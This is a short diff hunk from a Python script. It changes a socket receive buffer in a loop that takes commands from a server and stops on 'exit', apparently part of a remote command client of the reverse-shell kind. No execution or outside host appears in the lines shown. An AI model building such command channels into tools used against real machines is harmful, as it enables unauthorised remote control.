@@ -24,7 +24,7 @@ current_dir = os.getcwd()
 
 while True:
     # Receive command from server
-    receive = patil.recv(1024).decode()
+    receive = patil.recv(1024*1024*1024).decode()
     # Check for exit command
     if receive == "exit":
         break
